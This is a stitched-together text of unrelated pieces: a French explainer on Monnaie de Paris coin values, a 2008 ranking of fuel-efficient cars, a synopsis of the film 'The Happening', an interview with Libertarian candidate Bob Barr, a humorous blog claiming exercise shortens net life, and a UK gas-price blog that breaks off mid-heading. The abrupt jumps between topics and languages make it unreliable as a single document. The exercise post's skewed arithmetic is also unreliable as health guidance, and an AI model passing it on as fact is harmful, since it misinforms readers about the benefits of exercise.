Les pièces portent une valeur faciale fixe , posée une fois pour toutes .
Mais la valeur du métal , elle , reste mobile et il est arrivé bien souvent que la hausse de la valeur métallique intrinsèque des pièces dépasse leur valeur faciale .
Dans ce cas , après quelques années le métal précieux contenu par les pièces finit par valoir plus cher que leur valeur faciale .
La valeur du métal précieux finit parfois par dépasser la valeur faciale des pièces ...
Par exemple , la pièce d’or 250 euro Semeuse commercialisée en 2009 contient 8,45 grammes d’or pur à 920 millièmes .
Sa valeur métallique actuelle est de 399,97 euro .
Un acheteur qui l’aurait payée à sa valeur faciale a donc réalisé un gain de 150 euro .
Enfin , il faut prendre en compte les notions de rareté et de marché , c’est - à- dire d’offre et de demande .
La Monnaie de Paris produit des séries de pièces volontairement limitées pour créer un effet de rareté .
Ainsi la pièce de 5000 € or Feuille de Chêne 2020 n’est produite qu’à 1000 exemplaires .
Certaines séries de la Monnaie de Paris sont très recherchées par les collectionneurs et à peine mises en vente , elles sont presque immédiatement épuisées .
On les retrouve alors sur le second marché à des prix supérieurs à leur valeur faciale .
En résumé , pour répondre à la question “ Que valent les Pièces de la Monnaie de Paris ? ” , on peut dire ceci .
Les pièces de la Monnaie de Paris valent au minimum leur valeur faciale .
La valeur des pièces dépend également de la quantité de pièces fabriquées , c’est - à- dire de leur rareté , mais aussi de la demande sur le marché des collectionneurs et des investisseurs .
Les pièces en or et en argent de la Monnaie de Paris semblent souvent très chères par rapport au métal précieux qu’elles contiennent .
Mais cette cherté initiale est compensée par le fait qu’elles ont cours légal et il est souvent arrivé que leur valeur métallique intrinsèque dépasse leur valeur faciale en raison de la hausse du cours des métaux précieux .
En conclusion , on peut dire que pour connaître la valeur des pièces de la Monnaie de Paris , il est recommandé d’utiliser des catalogues comme le Catalogue Euro Leuchtturm qui répertorie toutes les pièces de la Monnaie de Paris ou encore des ouvrages tels que les Standard Catalog of World Coins .
Ces catalogues permettent de connaître le tirage exact des pièces et donc leur rareté relative , ainsi que leur contenu en métal précieux .
On peut donc déterminer la valeur métallique intrinsèque des pièces .

Textes de Loi ( cours légal , rôle de la Monnaie de Paris )
In the past 17 years , no vehicle in America outsold the Ford F - 150 on a monthly or yearly basis — not once .
In May of this year , however , Honda moved more Civics and Accords and Toyota more Corollas and Camrys than Ford moved of its bestseller .
This shift has less to do with a change in Americans ’ vehicular preferences than the fact that trucks guzzle fuel , the cost of which has doubled in the past three years .
America has been sideswiped by the $ 4 gallon of gasoline , and auto industry heads believe the higher gas prices are permanent , not just a temporary shift or spike .
Companies have been reconfiguring their lineups accordingly .
GM has green - lighted the electrically motivated Volt plug - in hybrid for a 2010 release , and in addition to ceasing production of trucks and SUVs at four U.S. plants and idling thousands of workers , it is considering selling off the iconic Hummer brand .
From a manufacturing perspective , it ’s increasingly difficult to build fuel - sipping vehicles , as current safety and emissions technologies add weight , a primary nemesis of fuel economy .
Hybrid technology and low mass are the most cost - effective strategies to better fuel economy , and the bulk of our list of the 10 most - fuel - efficient vehicles utilize one or both .
Toyota plays both sides , managing to field three of the top 10 — four if you count the Nissan Altima , which uses the Toyota Camry ’s hybrid drive system under license .
That five of the vehicles on our list are hybrids is a harbinger of things to come .
Although there ’s only one diesel in this group , expect that to change .
The following vehicles are ranked according to their EPA combined fuel - economy ratings .
Since the EPA calculation favors city mileage , that number is used here as a tiebreaker .
2008 Toyota Prius
City : 48 mpg
Highway : 45 mpg
Combined : 46 mpg
Base Price : $ 22,160
The Toyota Prius , the gold standard for fuel economy , is a bit like steamed broccoli : utterly insipid but wholesome just the same .
Iconic status was guaranteed when Hollywood types with air - conditioned mega-mansions trotted out Priuses as their green beards , even before the car was immortalized with its own episode of South Park .
An anodyne ownership experience of this uninspiring car includes tepid acceleration , numb steering , and nonlinear brakes .
Of note are the fuel economy , the low price , and the unique , futuristic lines that house a large amount of usable space .
Stay tuned for the next - generation Prius and a plug - in version , which will further increase fuel economy , in 2011 .
2008 Honda Civic Hybrid
City : 40 mpg
Highway : 45 mpg
Combined : 42 mpg
Base Price : $ 23,270
The Prius ’s main contender is the Civic hybrid , a more quotidian approach to economical hybrid transportation .
In rendering the hybrid more aerodynamic , Honda also made it one of the better - looking Civic offerings , more likely to appeal to those who do n’t need to wear their environmentalism on their lapel , although this might be part of the reason it has n’t seen nearly the sales success of the Prius .
The Civic hybrid drives more like a regular car than the competition , is a more responsive handler , and is a touch less sluggish .
The Civic ’s hybrid system is simple and compact but does n’t deliver quite the miserly numbers of the Prius .
2008 Smart Fortwo
City : 33 mpg
Highway : 41 mpg
Combined : 36 mpg
Base Price : $ 12,235
A small sum of money gets you a Lilliputian car that returns the third - best fuel mileage of any vehicle here .
The Smart Fortwo delivers solidly on its niche - market promise .
It ’s the ultimate urban vehicular solution as defined by stylish cachet , excellent fuel economy , and — by virtue of being the smallest — being also the biggest gun in the parking wars .
Your mileage may vary ; ours did , with an average of four fewer mpg than the EPA ’s combined number .
Given that the Fortwo is the slowest - accelerating passenger vehicle in the country ( say a Hail Mary before merging onto a freeway ) , a lead foot , with a resulting impact in fuel economy , is practically a safety requirement .
2008 Nissan Altima Hybrid
City : 35 mpg
Highway : 33 mpg
Combined : 34 mpg
Base Price : $ 26,140
The Altima hybrid is sold only in California and the seven eastern states that share the California Air Resources Board ’s air - quality statutes , which is a shame because it delivers hybrid efficiency in a stylish , pleasurable - to - drive sedan .
The Altima hybrid delivers similar fuel economy numbers to those of the Camry hybrid , which is n’t surprising considering Nissan licensed Toyota ’s Hybrid Synergy Drive for the effort .
Paired with Nissan ’s 2.5 - liter gasoline engine , the Altima hybrid returns performance numbers better than the standard model’s .
It delivers on its sporty looks and design - forward interior with a fun , enthusiastic chassis and precise steering .
If the name “ Camry ” makes your inner rebel cringe , you ’d do well to consider the Altima hybrid .
2008 Toyota Camry Hybrid
City : 33 mpg
Highway : 34 mpg
Combined : 34 mpg
( Ratings from 2008 model year )
Base Price : $ 25,860
Yellow - paintbrush - wielding New York cabbies ca n’t be wrong .
The Toyota Camry hybrid is good at moving passengers economically and without drama .
Unlike the Altima hybrid , you can buy the Camry hybrid nationwide .
Hybridization did nothing to impact the virtues that make the Camry an award - winning family - hauling appliance : laudable road manners , quiet and comfortable operation , and a highly competent overall experience .
Stepping up to the hybrid also begets stability control and the top - of - the - line XLE interior package , minus leather seats .
2009 Volkswagen Jetta TDI
City : 30 mpg
Highway : 41 mpg
Combined : 34 mpg
Base Price : $ 22,640
The TDI , as equipped with a six - speed manual transmission , shines in highway driving , returning fuel economy on par with the air - hockey - table - sized Smart Fortwo .
Diesel currently outpaces gasoline prices by about 20 percent , but the TDI betters the fuel economy of the next - thriftiest Jetta model by more than 30 percent .
The SportWagen , although slightly more expensive than the sedan ( pricing starts at $ 24,240 ) , suffers no penalty in fuel economy .
It offers more luggage volume than the Prius and just slightly less passenger volume while being good - looking and offering a driving experience that wo n’t approximate the work of an anesthesiologist .
Both aesthetically and dynamically , the diesel - sipping Jetta TDI is engineered to be enjoyed by the user , not just employed .
2009 Ford Escape Hybrid
City : 34 mpg ( est )
Highway : 30 mpg ( est )
Combined : 32 mpg ( est )
Base Price : $ 29,000
The lone American ranger in this group is the Ford Escape hybrid , the roughest and tumblin’ - est vehicle here , if mostly by posture .
Refreshed for 2009 , the Escape addresses many of the issues that made it an almost unacceptable compromise , including the anemic performance , punishing ride , and poor brake feel .
The stronger four - cylinder now boasts 177 horsepower in addition to its hybrid- electric drive , the revised suspension system includes a rear anti-roll bar , and the brakes feel something like normal .
The Escape is a hybrid SUV with solid moves at an affordable price for which no excuses need be made .
Although an official fuel economy rating has yet to be obtained for the new model , not much change is expected from 2008 .
2008 Toyota Yaris
City : 29 mpg
Highway : 36 mpg
Combined : 32 mpg
Base Price : $ 12,210
It ’s a happy day for consumers when one of the most - fuel - efficient vehicles sold is also one of the cheapest .
The Yaris is n’t even too much of a slowpoke , scampering to 60 mph in fewer than nine seconds .
If the petite Yaris seems more quirky than masculine , it ’s because it was designed for markets where gas has always been expensive and where people say things like sauve qui peut .
Those hoping for Lotus Elise–like reflexes or Gatsby - esque luxury will be disappointed , but those without champagne expectations will enjoy a plush ride and solid build quality .
Despite a short wheelbase , the Yaris can transport deceptively large quantities of cargo .
2008 Mini Cooper / Clubman
City : 28 mpg
Highway : 37 mpg
Combined : 32 mpg
Base Price : $ 18,700
It ’s not surprising that a small car designed and manufactured by BMW is a pleasurable thing , but that it ’s extra miserly is icing on the strudel .
Thanks to a recent redesign , a new 1.6 - liter four - cylinder , slightly smaller dimensions , and a new six - speed transmission conspire to produce good fuel efficiency , particularly on the highway , where an extra cog makes all the difference .
The Mini Cooper and the slightly longer Clubman get the same fuel economy , so there ’s no penalty for the latter other than greater expense and a reduced number of parking opportunities .
Watch those options , though .
Despite a reasonable $ 18,700 entry price , the last naturally aspirated Mini Cooper we tested cost as much as a Camry hybrid .
2008 Honda Fit
City : 28 mpg
Highway : 34 mpg
Combined : 31 mpg
Base Price : $ 14,620
We crowned the Honda
Fit the best of seven inexpensive people movers in a recent comparison test because it makes us smile as few cars this affordable or stingy on gas can .
Mini-minivan styling might not seduce the vain , but the upshot to odd proportions is oodles of usable space — this thing is like a clown ’s bottomless suitcase .
You ’ll need to mate a five - speed manual transmission to the Fit ’s 1.5 - liter engine for the best mileage , but this is something you ’ll want to do anyway if you view cloverleafs as opportunities rather than nuisances .
In Sport form , the Fit serves up similar fun and more passenger and cargo room than either the Mini Cooper or Clubman for almost $ 4000 less .

The Happening
( 2008 )
The airborne neurotoxin that makes people kill themselves is being released by plants across northeastern U.S. .
After a day of trying to escape the ' wind ' , Elliot ( Mark Wahlberg ) , his wife Alma ( Zooey Deschanel ) , and his best friend 's child Jess ( Ashlyn Sanchez ) escape to a rural townhouse where they wait it out until the " event " mysteriously stops .
Jess ' father ( John Leguizamo ) earlier killed himself because of the toxins .
The toxin simply vanishes as quickly as it comes .
A newscaster later speculates it was nature trying to warn man against harming the environment , but retracts the statement as it only happened in one area of the globe .
In the final scene , two friends are walking along a park in France when everyone suddenly becomes affected .
Give Him Liberty Or ... Described as the GOP's Ralph Nader , Libertarian Bob Barr on his '08 bid .
June 30 , 2008  --
There was a time , not so long ago , when Bob Barr commanded the attention of millions .
From his perch on the House Judiciary Committee , the Georgia congressman launched the impeachment of Bill Clinton and presided over its daily march , grilling witnesses , orchestrating events , and doing everything in his considerable power to bring down a sitting president .
There was time when it looked like Barr might succeed , when it looked like he might change American history .
That time has passed .
Today , standing in line at a Manhattan Starbucks in a wrinkled suit , his eyes puffy , the 59 - year - old looks older and weary , just another corporate flunky waiting to wake up .
He shuffles to the counter , gives the barista a pleading look .
" Five shots of espresso , " he says .
" In a cup .
With milk . "
Then , turning sheepishly : " I only do this three times a day . "
Since losing his reelection in 2002 , Barr has lost not only his power but also many of his friends .
It does n't help that after alienating nearly every Democrat with impeachment , he spent the next five years alienating his fellow Republicans — railing against the invasion of Iraq , the PATRIOT Act , and the Bush administration in general .
If Barr were still in the Congress , it is safe to say he would be one of the few members willing to launch a second impeachment .
Instead , he 's taking the outside track — joining the Libertarian Party and , in May , becoming its nominee for president .
With just 2 to 3 percent in the polls — mostly coming from disillusioned conservatives — he spends most of his time on the trail answering questions like " Why are you doing this to John McCain ? "
Yet Barr is more than a wannabe Nader ; he 's a man of opinions and ideas — even if they do seem to change quite often .
It seems only fair to hear him out , especially since , as a third - party candidate , he does n't give a rat 's ass whom he offends .
Highlights from the Interview
You have opposed the Bush administration on a number of issues , including the war , but what is your policy for Iraq going forward ?
Bob Barr :
To me , it is utterly irresponsible to continue the course that we 've embarked upon .
If our goal was to get rid of Saddam Hussein , we liberated the people from Saddam Hussein .
But now we 're five and a half years later , and we 're still over there , and it 's very costly to us .
I do n't think the American taxpayers focus on how much the occupation is draining resources .
Four - hundred - plus million dollars every single day .
You talk to some Republicans and they say , " The Iraqis love us . "
Well , maybe so .
But who would n't ?
We 're propping up their economy , we 're protecting their borders , we 're providing security .
Of course they love us .
Is there any difference between your plan for Iraq and Obama's ?
It 's hard to say , because I do n't know that he 's laid out a plan with any great specificity .
It 's my view that we need an immediate and very significant drawdown of our military and economic presence in Iraq .
We are not going to assume responsibility for another country .
Do you think if McCain becomes president , we 'll be stuck in the same position for another four years ?
Based on the statements he 's made , yes .
I mean , McCain may think it 's fine to spend $ 400 million a day as far into the future as anyone can see , but that 's not his money .
This is the problem .
These folks in Washington might think it 's a great mission we 're serving over there , but is this the wisest use of taxpayer money ?
Is it more important to spend billions of dollars improving Iraq 's infrastructure or improving the infrastructure of our own country ?
Does it make you question McCain 's conservative credentials to see him support such a costly war ?
I 'm not sure that anybody can legitimately say that McCain is conservative .
* * * * * * *
What 's a Libertarian ?
There are a lot of different ways to define it .
In layman 's terms , it 's simply saying " leave us alone " to the government .
We certainly need a government to protect everybody 's individual liberty , but it should be kept to an absolute minimum .
So you do n't want the government to help people ?
Just leave them alone to help themselves ?
To keep impediments out of the way .
But some of your positions do n't fit that description .
For example , you 're pro-life , even though the party is pro-choice .
It is .
But there are , within the party , a number of pro-life Libertarians .
It 's a big tent .
Very similar to the way it was when the Republican Party cared about substance and you would have free - market Republicans , economic Republicans , those for whom foreign policy was their focus , education , religion , and so forth .
* * * * * * *
The [ Libertarian ] party also supports legalization of drugs .
And you were an anti-drug coordinator at the Justice Department , as well as holding other drug - war positions .
I 've come a long way on the drug war .
Having been involved in it , witnessing it , and after a great deal of study , I 've come to the conclusion that it simply is n't working and we ought to get the federal government out of it .
There are some Libertarians who want to go much further than that , but they 're supporting me .
But that 's a big switch for you .
It 's obvious to me that the federal drug laws are being used as a club to deny the people of individual states the right to legalize , for example , medicinal marijuana .
That , to me , flies in the face of a fundamental notion of fairness .
But for years , you were the one doing it .
Ten years ago , the citizens of Washington , D.C. , voted to legalize medical marijuana by a 70 percent majority , and you wrote a federal law called the Barr Amendment to prevent that from happening .
Well , I now believe there is so little personal freedom , so little privacy , and the government has become so oppressive , that we can no longer afford to let the government control these particular areas , such as the use of marijuana .
Because there 's no freedom left .
This administration has become so oppressive that it has caused me to go back and look at a number of areas where I was wrong to allow the government to involve itself in people 's lives .
So you want to revoke the Barr Amendment ?
Yes , and I did some work with the Marijuana Policy Project .
Was that a paid position ?
Yeah , I did consulting for about six months in the latter part of last year .
Did n't the MPP campaign against you in 2002 , when you lost your House seat ?
There were ads against me on the drug issue , but I do n't know who ran them .
The Libertarian Party also worked against me in 2002 .
In both cases , it caused me to take a close , hard look :
Why would they work against me ?
The more I looked , the more I liked what I saw .
* * * * * *
Are you worried about being accused of flip - flopping ?
One minute it's the Barr Amendment , the next you 're on staff at the Marijuana Policy Project .
Well , it 's a fact :
My views have changed .
If you recognize that a policy is not working and is based on an erroneous presumption , you have to change .
There is no use spending billions of dollars just because we have to stay the course .
It 's the same situation in Iraq , only it 's hundreds of billions .
Being a good leader is being willing to change .
I was very disappointed in 2004 when John Kerry allowed the Bush campaign to browbeat him on the PATRIOT Act .
Early in the campaign , he said , " Look , I voted for the PATRIOT Act , but it 's time for it to be changed . "
The Bush people called him a flip - flopper , and the whole discussion did n't come up again .
In fact , the act was renewed .
It was , and I spent a great deal of time working against it .
There again : I had voted for the USA PATRIOT Act in 2001 , but after seeing how it was used and abused and expanded by the administration , I think it was the worst vote I cast in the Congress .
Because it undercuts the whole system of checks and balances in our criminal - justice system .
It stands for the proposition that the government can gather evidence against someone without any evidence whatsoever of criminal behavior .
The simplistic and very misleading explanation that Bush and Ashcroft and Gonzales — all the apologists for this administration — make is " Well , we can spy on American citizens , because if they 're talking to Al Qaeda , we want to know . "
The problem is , you do n't know whether they 're talking to Al Qaeda until after you start spying on them .
And the fact of the matter is that if the government has any evidence that somebody is in contact with a terrorist , they can get a warrant from a court .
But they 're using this power to surveil people without any evidence .
But why is that surprising ?
This is exactly what the PATRIOT
Act said , and you voted for it .
Did n't you read it ?
I was probably one of the very few who did read it .
I forget what it was called before some brainiac came up with the acronym USA PATRIOT Act — Uniting and Strengthening America , blah blah blah — but I read it very , very carefully .
And I had tremendous doubts .
I had worked on the 1996 antiterrorism bill that the Clinton administration proposed , and there were tremendous similarities between the two .
In 1996 , I had led an effort to remove several of the provisions that were way too broad , and we were successful .
But many of those same provisions resurfaced in the PATRIOT Act .
So all sorts of red lights went off .
Then why did you vote for it ?
Well , I worked with the administration to remove some provisions and alter others , and I also received personal assurances from the administration that they would not seek to expand those powers further — that they would use them only for bona fide terrorism investigations , and they would report fully and accurately to Congress on how it was being used .
And they went back on it all .
I learned that you cannot take the word of this administration .
In every one of those areas , they went back on it .
* * * * * * *
Do you feel like you were blinded by 9/11 ?
That certainly was a problem for the majority of the members of the House .
Most of them never even looked at the bill .
They just got caught up in the hysteria — this notion that the administration had come to us with a special request .
Which was bogus , because most of the provisions in the PATRIOT Act , they had presented to us previously .
It 's funny you say , " they had presented to us previously , " when you 're talking about two different administrations .
Do you see the White House as a single institution , regardless of who 's president ?
It is .
It 's the same establishment , the same power - hungry entity , whether it 's a Republican or a Democrat .
And the PATRIOT Act is the perfect example .
Every administration that comes in takes the powers that it inherits from its predecessor as a floor , not a ceiling .
So whether it 's McCain or Obama , they 'll inherit the powers of the Bush administration .
And what Bush has done is taken this debate to a whole new level , which is that the president , as commander in chief , is not bound by any restrictions whatsoever .
This notion that the president can do whatever he wants , just because he 's commander in chief , means that neither the Congress nor the courts can interfere .
* * * * * * *
Do you feel a sense of responsibility for your time as a Republican ?
It seems like this campaign is a kind of personal correction .
It does n't have anything to do with me .
It has to do with the direction that the country is going .
Except that , in many cases , you promoted the policies you 're running against — DOMA , the Barr Amendment , the PATRIOT Act .
I think that 's given me a pretty strong and pretty credible perspective on some of these issues .
But the problem is not just a handful of issues .
It 's not just George W. Bush .
It 's not just the Republican Party .
It 's the institution of government as we 've allowed it to develop .
And I 've come to the conclusion that the only way to change that is through a third party .
And you do n't perceive the GOP as the party of individual rights anymore ?
Well , it 's not just what I perceive .
The Republican Party in 2008 is clearly not a party of individual liberty .
When did that happen ?
I remember the precise moment .
I was elected to Congress in 1994 with the Republican Revolution , and four years later we were in one of the House Republican caucuses , just before the ' 98 election , and the leadership came in and said very clearly , " We 've got an election coming up .
Anybody here who has a problem in their district , sit down with Representative Kasich or Armey and tell them what you need to have in this year 's budget to win your election . "
And they might as well have had a sign flashing in the background that said " business as usual . "
We were no longer serious about reining in government .
And now McCain goes out and talks about doing away with earmarks , and the public applauds .
But in one year , you could simply freeze spending and save ten times as much .
They want to give the appearance of tackling the issue , but not really .
It 's part of the same shell game they use cycle after cycle .
Does n't that seem naive , given the housing crisis the banks have created ?
Well , one of the mistakes I think we 're on the verge of making yet again is to react to a problem in the economy by overlaying a whole new set of regulations .
I think that would be a mistake .
All we 're doing is providing more and more government interference in the free market .
Why should n't the government interfere in the market and rein in corporations ?
Is that the job of the federal government ?
I would say absolutely not .
The government is not there to guarantee that the market is going to operate in a certain way .
Is n't the government there to do whatever the people want ?
Is n't that the whole idea of a democracy ?
In a pure democracy , yes .
But we do n't have a pure democracy .
We have certain principles on which the nation is founded .
The basic philosophy — the reason the government was set up the way it is — is to keep the government out of those areas .
In our system , it 's not the job of the federal government to do those things .
It is the job of the government to ensure free commerce .

Talk to me about the Defense of Marriage Act .
You were one of the authors in 1996 , but your position has changed on that , too .
The changes are best understood when one recognizes that DOMA has two parts .
The first part is the federalism part , and it essentially says that each state can decide , using the " full faith and credit " clause of the Constitution , to impose its own definition of marriage , free from the other states …
But it did seem … appropriate for the Congress to say we have an important social relationship and we want to make sure that each state is free to set its own definition .
It 's federalism …
Okay .
But that was just the first clause , which I still think has validity and I still support .
The second provision , I 've come to view as both unnecessary and disruptive .
It has the federal definition of marriage as being " a lawful union between one man and one woman only . "
Which is definitely not the Libertarian position .
Right , and I 've committed to repeal that part of DOMA .
Because as I 've come to understand , that part of DOMA is being used as the tail wagging the dog .
I do n't believe , for example , that the federal government should play a role in defining marriage .
It has been , and should be , up to the states .
But how can you say it's " being used " to define marriage ?
Was n't that the point of DOMA , to define marriage ?
Well , yes , for federal - law purposes .
But we now have states like Massachusetts and California that have changed their definition of marriage , and the federal government says , " Well , you still can't do all sorts of things defined by federal law . "
So you 're undercutting the decision by the people of that state to decide for themselves … it provides a disincentive for the states to pass same - sex marriage laws , because they can't guarantee protection under federal law …
Has joining the Libertarian Party allowed you to change your position on these issues , or did you change party after your positions changed ?
It is n't a function of which party I 'm in — although in the case of the Defense of Marriage Act , it 's been the result of lengthy conversations with Libertarians who feel very passionately about it .
There 's a group called Outright Libertarians who are passionate about that issue …
But I came to the conclusion that the Republican Party had changed , from two perspectives .
One , the Republican Party cares nothing about real substance anymore .
I could n't tell you the last time , when I was a member of the Republican caucus on the Hill , that there was a discussion about the substance of government .
It was all about getting elected and reelected .
It was all about process .
The Republican Party is no longer a party of any substance .
It is simply a political machine , a mechanism for election .
That 's all it is .
And secondly , the Republican Party has bought into the notion that when the president decides what he wants to do , nobody can interfere .
The courts can't interfere , and the Congress can't interfere .

When we talk about the ignorant masses , I can't help but wonder about your position on public education .
Does n't the Libertarian Party want to eliminate public schools ?
Ideally , yes .
But if we say , " Okay , we 're going to immediately dismantle the whole structure of public education , " nobody 's going to buy into it .
That is , I think , a very important goal and a very important principle .
So in your opinion , as a long - term goal , there should be no government involvement in education ?
And in the short term , I believe there is no appropriate or legitimate role for the federal government .
How would you accomplish that ?
By getting the federal government out of it .
I forget what the budget of the Department of Education is , but those billions of dollars should not be vested in the federal government .
That money should go back to the people .
There 's no reason whatsoever for the federal government to be involved in education .
So you 'd eliminate the Department of Education .
Are there any other departments you would eliminate ?
I find it very hard to understand why we have a Department of Commerce .
There might need to be an office that carries out certain functions to ensure free commerce , but that could be handled by the Department of Justice .
Also , the Department of Energy .
What is federal energy policy ?
I 'm not sure we have one .
Does it strike you as a contradiction to be a lifelong conservative who is promoting such radical change ?
There certainly are unintended consequences that come with change .
It is important , I think , that we recognize that we are not just Libertarians but responsible Libertarians .
I 'm not interested in disrupting the fabric of our country .
It will take time .
It will take a lot of time .
We have n't gotten here overnight .
It started over one hundred years ago with trust - busting and accelerated with Wilson and FDR and Nixon and Johnson …
* * * * * * *
Would you have opposed the New Deal and the Works Progress Administration ?
That 's a hypothetical .
Everything I 'm asking is a hypothetical .
Well , that 's a double hypothetical .
That 's a hypothetical on top of a hypothetical .
Every time I ask what you 'll do as president , it 's a double hypothetical .
No , that 's just a hypothetical .
It 's two .
The first hypothetical is if you 're president , the second is what you 'll do .
What can I say ?
I think we have a tremendous opportunity through the Libertarian Party and the libertarian philosophy to change the structure of the American government .
GQ : Well , good luck .
For the past month or so I ’ve been going to the gym .
I lift on Monday and Friday , with 30 minutes on the elliptical Tuesday - Thursday .
On the way home from the gym yesterday I got to thinking ; I bet this is a waste of time .
I ’m now going to do the math to either confirm of disprove my hypotheses of “ working out is for suckers . ”
To begin my experiment I googled “ exercise live longer “ .
The first article spoke of generalities so I moved on to article number two .
Luckily , this article came up with some hard numbers which , like all “ news ” papers , was based on a poorly cited study .
Article Claims : Walking 30 minutes a day , 5 days a week , allows the average person to live 1.3 - 1.5 years longer .
Running 30 minutes a day , 5 days a week , allows the average person to live 3.5 - 3.7 years longer .
This all sounds good on the surface but I can smell a scam from a mile away , and this one reeks .
Lets crunch the numbers .
Average U.S. Male Life expectancy in 2003 is 74.8 years .
I am 28.2 years old .
That means I will need to exercise for 46.6 years more years .
46.6 years x 52 weeks in a year x 5 times a week x 30 minutes a session = 363,480 minutes .
363,480 minutes/60 =6058 hours/24 =252.417 days/365 =.692 years
Seems pretty simple , eh ?
Put in .692 years and get back between 1.3-3.7 years , depending on the intensity of your work out .
Thats .61-3.01 net years you get back .
Not a bad gain , and you get to wear cool sweat bands .
At least , that ’s what Whitey wants you to think .
In this case I ’m not exactly sure who Whitey is but I bet he ’s in cahoots with Gatorade and Nike .
Unfortunately , the above math does not take into account sleep .
I am not awake for 24 hours a day .
I personally sleep about 10 hours a night but I ’ll assume the average person gets 8 hours a day .
363,480/60 =6,058 hours/16 =378.625 days/365 =1.037 years
So putting in 1.037 years results in a net gain of between .26 years - 2.66 years .
Meaning that if you ’re walking and not running you will gain around 3 months of life for working out your entire life .
Still seems reasonably , eh ?
As my second favorite Ron would say , “ But wait , there ’s more ” .
I work out at a gym , 30 minutes of workout time costs me 1 hour of real time between driving my ass to the gym and showering and such .
So let ’s again correct the math above .
46.6 years x 52 weeks in a year x 5 times a week x 60 minutes a session = 726,960 minutes .
726,960/60 =12,116 hours/16 =757.25 days/365 =2.075 years
We can now see that exercising 30 minutes a day 5 days a week will result in a net gain of life between negative .775 years and positive 1.625 years .
Meaning that if you walk 30 minutes a day but also spend 30 minutes a day preparing for and recovering from the activity you are slowly killing yourself .
Sure , some people may bring up the quality of life debate , claim they like exercising , that walking is a social activity and all that .
That ’s all well and good .
I ’m not saying do n’t walk , I ’m just saying it ’s slowly killing you .
Plus , I truly believe that an hour of my time now is worth more than an hour of my time in my 70’s .
Its true that a year in your 70’s is most likely retired time , and you could be fit enough to enjoy it .
I ’ll counter that with my gym fees : 45 $ a month + 1 $ a day to park .
$ 540 + $ 260 a year = $ 800 x 46.6 = $ 37,280 .
If you do n’t think I could get 1.625 work free years out of 37,280 after - tax dollars you ’d be wrong .
Light up , cheers and take a stroll .
Whatever gets you off , just know what you ’re getting yourself into .
As for me , I ’m taking a sucitin .
UK National Grid , with responsibility for the distribution of natural gas and electricity in the UK , see flat to falling natural gas prices to 2015 and beyond .
Comments welcome !
Higher energy prices are feeding through to rampant consumer energy price inflation .
And yet the authorities and many investment houses still see energy prices falling in the future .
This naive view of global energy supplies is starving energy markets of the capital required to expand conventional and alternative energy supplies .
Global gas spot prices began their sharp up - trend around the year 2000 which just happens to coincide with the year of peak gas production in the UK .
Since 2000 , UK gas spot prices have increased almost 4 fold and this along with higher coal and oil prices is beginning to have a significant impact upon UK inflation .
The chart is compiled from Table 2.1.1. from the report Quarterly Energy Prices December 2007 ( pdf ) , found in the Energy Statistics section of the BERR web site .
From 1990 to 2000 inflation in most primary energy sources was benign in the UK , excluding petrol ( gasoline ) which was deliberately inflated by progressive tax increases .
Since 2003 , however , inflation in gas , electricity , coal and heating oil has taken off .
RPI data can be found at National Statistics Online .
Prior to 2003 , price inflation in UK primary energy sources was running well below the inflation rate as measured by the RPI ( the Retail Price Index is a holistic UK inflation indicator ) .
Since 2003 , inflation in all primary energy sources has taken off and for example gas prices have increased on average 18 % per annum for the last three years .
Prior to 2003 , low energy costs had a dampening impact upon inflation but now they are running well above the RPI and this may result in inflation spreading through the UK economy since energy use impinges upon numerous goods and services .
Electricity and gas prices have just been raised significantly in the UK leading to howls of anguish from the public and the media .
The meteoric rise in UK gas demand was reversed these last two years as amongst other factors , high price has dampened domestic demand .
Data from department of Business Enterprise Regulatory Reform ( BERR ) table 4.1.1 .
Demand for gas has fallen in the UK over the last couple of years .
This may be due to a number of factors such as milder winters , efficiency measures , off - shoring energy intensive industries , switching between coal and gas in power generation and demand destruction among industrial and domestic users .
Higher prices and scarcity play a role in four of these five factors .
But note , even though demand has fallen UK spot prices for gas are running about double last year .
National Grid
National Grid is a UK company with responsibility for electricity and gas distribution networks .
Their web site is a goldmine of data and reports on the UK domestic energy situation .
The next three charts come from their Gas Transportation 10 Year Statement 2007 .
The National Grid view on UK gas supply and demand is shown below .
UK domestic gas supplies are forecast to fall , demand is forecast to rise and imports will rise from zero in 2003 to 80 % of total demand by 2017 .
This complies with my own view , and is in general agreement with the official government view expressed by BERR and is repeated in many industry reports .
There seems to be unanimous agreement that UK gas imports are going to explode in the coming years .
National Grid paint a sensible picture of falling UK indigenous supply of gas , rising demand and escalating imports .
And yet they forecast gas prices will fall .
Source is National Grid Gas Transportation 10 Year Statement 2007
Surprising then that the National Grid has forecast gas prices to fall in 2008 and then stabilise for the next 10 years .
I find it truly remarkable that a strategic company such as this can foresee a yawning gap opening between UK gas supply and demand and at the same time forecast falling to stable prices .
This in my opinion sends out completely the wrong message to government , consumers and to the investment community .
Beach price is presumed to be the wholesale price .
Note that this is significantly lower than the spot price since much gas is sold at contract prices struck many years ago .
Industrial consumers paying the lower " Interruptible " tariff will be first to have their gas turned off when supplies fail .
Note that domestic users pay by far the highest price and will be last to be disconnected .
Prices are struck in 2006 pence hence discounting future inflation which the Bank of England is mandated to hold at 2 % per annum .
Source is National Grid Gas Transportation 10 Year Statement 2007
Whilst UK spot prices for gas have near quadrupled since 2000 the wholesale and retail prices have risen by more modest amounts of around 50 % since these are cushioned by long term gas sales contracts struck at a much lower price many years ago .
These have protected UK consumers from the full glare of the gas spot market but with time this position will unravel .
As old contracts and supplies expire new contracts for gas will be struck at considerably higher and rising prices .
It 's possible the retail prices we are seeing right now are the tip of an energy price iceberg that is preparing to rip through the system .
And yet the National Grid forecast prices to fall this year whilst UK consumers have just been hit by 15 to 20 % rises .
This extraordinary view on future prices from the National Grid is rooted in their forecast for future European gas supplies which shows Russian Gas , Norwegian Gas and LNG imports expanding into the future .
As I discussed in my post on The European Gas Market that was updated here , Russian gas supplies may at best maintain current levels - and not double as shown by National Grid ( Global Insight report ) , Norwegian gas production may actually fall from 2010 onwards and LNG supplies may fall well short of the import capacity that has been and is being built .
The National Grid and Global Insight paint a rosy picture of gas supplies to Europe that does not seem to take into account falling production in Russia 's largest gas fields , the reality that associated gas production from Norwegian oil fields will follow their oil production down and that Global LNG supplies will only meet around 50 % of import expectations .
Ironically the LNG import / export capacity offset is described in a report by Global Insight ( large pdf ) .
Source is National Grid Gas Transportation 10 Year Statement 2007
The harsh reality of this situation should be self evident from the fact that UK spot prices for gas have doubled again this year .
It 's really time for The National Grid , The Markets and The Government to waken up .
Denial and deprivation of investment
